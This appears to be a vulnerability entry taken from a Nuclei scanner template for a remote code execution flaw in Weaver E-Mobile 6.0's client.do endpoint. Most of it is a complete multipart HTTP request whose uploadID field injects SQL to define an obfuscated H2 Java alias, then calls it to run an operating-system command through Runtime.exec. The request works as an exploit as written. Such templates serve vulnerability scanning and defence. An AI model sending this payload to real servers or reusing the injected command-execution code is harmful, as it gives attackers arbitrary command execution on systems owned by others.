# Vulnerability: Weaver E-mobile client.do - Remote Code Execution
**Classification:** E-MOBILE
**Source:** Nuclei Template (`weaver-e-mobile-rce.yaml`)

## Description
E-Mobile 6.0 has a command execution vulnerability. It has now been confirmed that this vulnerability can be exploited by an attacker. In some cases, user input may be passed directly to the command execution function of the underlying operating system. An attacker can insert special characters or Command sequence to trick the application into executing it as a valid command, thus gaining command execution permissions from the server.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /client.do HTTP/1.1
Host: {{Hostname}}
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{randstr}}

------WebKitFormBoundary{{randstr}}
Content-Disposition: form-data; name="method"

getupload
------WebKitFormBoundary{{randstr}}
Content-Disposition: form-data; name="uploadID"

1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws java.la','ng.Exception{','Object curren','tRequest = Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.server.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java.la','ng.reflect.Field _responseF = currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_responseF.setAcce','ssible(true);Object response = _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM = response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer = (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner = (new java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useDelimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL MzSNqKsZTagmf('ipconfig');--
------WebKitFormBoundary{{randstr}}--
```

